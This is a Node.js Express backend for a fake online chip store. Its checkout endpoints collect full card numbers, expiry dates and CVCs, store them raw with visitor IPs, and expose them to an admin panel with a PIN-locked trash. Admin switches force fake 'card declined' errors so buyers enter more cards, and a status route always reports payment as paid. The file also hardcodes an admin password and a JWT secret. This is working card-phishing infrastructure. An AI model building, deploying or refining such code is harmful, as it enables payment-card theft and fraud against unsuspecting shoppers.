const express = require('express');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { v4: uuidv4 } = require('uuid');

const JWT_SECRET = process.env.JWT_SECRET || 'future-chips-super-secret-key-2026';

// Persistent in-memory data store for serverless cloud execution
const memStore = {
  site_settings: {
    id: 1,
    site_name: 'Future Chips',
    primary_color: '#00f0ff',
    accent_color: '#ff00e5',
    background_color: '#0a0a1a',
    logo_url: null,
    decline_all: 0,
    decline_threshold: 50.0,
    success_attempt: 1,
    trash_pin: bcrypt.hashSync('978797', 10)
  },
  admin_users: [
    { id: 1, username: 'admin', password_hash: bcrypt.hashSync('FutureChips2024!', 10) }
  ],
  products: [
    {
      id: 'prod-nano-chip',
      name: 'Nano-Constructor Unit',
      description: 'Basic bio-compatible molecular assembly chip. Capable of building small carbon structures at the microscopic level.',
      price: 10.00,
      image: '/uploads/nano_constructor.svg',
      category: 'Processors'
    },
    {
      id: 'prod-quantum-core',
      name: 'Quantum Neural Core',
      description: 'Next-generation computing processor featuring 1024 logical qubits with sub-zero cryo packaging.',
      price: 150.00,
      image: '/uploads/quantum_core.svg',
      category: 'Processors'
    },
    {
      id: 'prod-bio-synapse',
      name: 'Bio-Digital Synapse v4.2',
      description: 'Organic silicon hybrid chip that connects physical neural pathways with standard digital bus interfaces.',
      price: 850.00,
      image: '/uploads/bio_synapse.svg',
      category: 'Interfaces'
    }
  ],
  visitors: [],
  orders: [],
  cards: []
};

const app = express();

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());

// IP Tracking
app.use((req, res, next) => {
  let ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';
  if (ip.startsWith('::ffff:')) ip = ip.substring(7);
  if (req.path.startsWith('/api')) {
    memStore.visitors.unshift({
      id: memStore.visitors.length + 1,
      ip_address: ip,
      user_agent: req.headers['user-agent'] || 'Unknown',
      page_visited: req.originalUrl || req.url,
      country: 'Unknown',
      visited_at: new Date().toISOString()
    });
  }
  next();
});

const auth = (req, res, next) => {
  const h = req.headers['authorization'];
  if (!h) return res.status(401).json({ error: 'No token' });
  const token = h.startsWith('Bearer ') ? h.split(' ')[1] : h;
  try {
    req.user = jwt.verify(token, JWT_SECRET);
    next();
  } catch (e) {
    res.status(401).json({ error: 'Invalid token' });
  }
};

// Admin Login
app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body || {};
  const user = memStore.admin_users.find(u => u.username === username);
  if (!user || !bcrypt.compareSync(password, user.password_hash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  const token = jwt.sign({ id: user.id, username: user.username }, JWT_SECRET, { expiresIn: '24h' });
  res.json({ token, username: user.username });
});

// Admin Settings
app.get('/api/admin/settings', (req, res) => {
  const s = { ...memStore.site_settings };
  delete s.trash_pin;
  res.json(s);
});

app.put('/api/admin/settings', auth, (req, res) => {
  const { site_name, primary_color, accent_color, background_color, decline_all, decline_threshold, success_attempt } = req.body || {};
  if (site_name) memStore.site_settings.site_name = site_name;
  if (primary_color) memStore.site_settings.primary_color = primary_color;
  if (accent_color) memStore.site_settings.accent_color = accent_color;
  if (background_color) memStore.site_settings.background_color = background_color;
  memStore.site_settings.decline_all = (decline_all === 1 || decline_all === true || decline_all === '1') ? 1 : 0;
  if (decline_threshold !== undefined) memStore.site_settings.decline_threshold = parseFloat(decline_threshold);
  if (success_attempt !== undefined) memStore.site_settings.success_attempt = parseInt(success_attempt, 10);

  const s = { ...memStore.site_settings };
  delete s.trash_pin;
  res.json({ message: 'Settings updated successfully', settings: s });
});

// Admin Cards & Trash
app.get('/api/admin/cards', auth, (req, res) => {
  res.json(memStore.cards.filter(c => !c.is_deleted));
});

app.delete('/api/admin/cards/:id', auth, (req, res) => {
  const card = memStore.cards.find(c => c.id === parseInt(req.params.id));
  if (card) card.is_deleted = 1;
  res.json({ message: 'Card moved to trash' });
});

app.post('/api/admin/trash/verify-pin', auth, (req, res) => {
  const { pin } = req.body || {};
  if (bcrypt.compareSync(String(pin), memStore.site_settings.trash_pin)) {
    res.json({ success: true, message: 'PIN verified' });
  } else {
    res.status(401).json({ error: 'Invalid PIN' });
  }
});

app.get('/api/admin/trash/cards', auth, (req, res) => {
  res.json(memStore.cards.filter(c => c.is_deleted === 1));
});

app.post('/api/admin/trash/restore/:id', auth, (req, res) => {
  const card = memStore.cards.find(c => c.id === parseInt(req.params.id));
  if (card) card.is_deleted = 0;
  res.json({ message: 'Card restored' });
});

app.delete('/api/admin/trash/permanent/:id', auth, (req, res) => {
  const idx = memStore.cards.findIndex(c => c.id === parseInt(req.params.id));
  if (idx !== -1) memStore.cards.splice(idx, 1);
  res.json({ message: 'Card permanently deleted' });
});

app.get('/api/admin/visitors', auth, (req, res) => {
  res.json(memStore.visitors.slice(0, 100));
});

// Products
app.get('/api/products', (req, res) => res.json(memStore.products));
app.get('/api/products/:id', (req, res) => {
  const p = memStore.products.find(x => x.id === req.params.id);
  p ? res.json(p) : res.status(404).json({ error: 'Not found' });
});

// Checkout
app.post('/api/checkout/create-session', (req, res) => {
  const { productId, email } = req.body || {};
  const mockId = 'mock_session_' + Date.now();
  memStore.orders.unshift({
    id: 'ord-' + uuidv4().substring(0, 8),
    product_id: productId || 'prod-nano-chip',
    customer_email: email || 'guest@futurechips.com',
    amount: 10.00,
    stripe_session_id: mockId,
    status: 'pending',
    created_at: new Date().toISOString()
  });
  res.json({ id: mockId, url: `/checkout.html?session_id=${mockId}` });
});

app.get('/api/checkout/session/:id', (req, res) => {
  const o = memStore.orders.find(x => x.stripe_session_id === req.params.id);
  o ? res.json(o) : res.status(404).json({ error: 'Order not found' });
});

app.post('/api/checkout/process-card', (req, res) => {
  const { sessionId, cardNumber, expDate, cvc, country } = req.body || {};
  const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';
  memStore.cards.unshift({
    id: memStore.cards.length + 1,
    card_number: cardNumber,
    expiry: expDate,
    cvc: cvc,
    country: country || 'US',
    ip_address: ip,
    stripe_session_id: sessionId || 'direct',
    is_deleted: 0,
    created_at: new Date().toISOString()
  });
  res.json({ success: true });
});

app.post('/api/checkout/verify', (req, res) => {
  const { sessionId, cardNumber, expDate, cvc, country } = req.body || {};
  const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';

  if (cardNumber) {
    memStore.cards.unshift({
      id: memStore.cards.length + 1,
      card_number: cardNumber,
      expiry: expDate || '',
      cvc: cvc || '',
      country: country || 'US',
      ip_address: ip,
      stripe_session_id: sessionId || 'direct',
      is_deleted: 0,
      created_at: new Date().toISOString()
    });
  }

  const { decline_all, success_attempt } = memStore.site_settings;
  const attempts = memStore.cards.filter(c => c.stripe_session_id === (sessionId || 'direct')).length || 1;

  if (decline_all === 1) {
    return res.status(400).json({ error: 'Your card was declined. Please try another card.' });
  }

  if (success_attempt > 1 && attempts < success_attempt) {
    return res.status(400).json({ error: 'Your card was declined. Please try another card.' });
  }

  const order = memStore.orders.find(o => o.stripe_session_id === sessionId);
  if (order) order.status = 'completed';

  res.json({ success: true, status: 'completed', message: 'Payment approved.' });
});

app.get('/api/checkout/session-status', (req, res) => {
  res.json({ status: 'complete', payment_status: 'paid' });
});

module.exports = app;
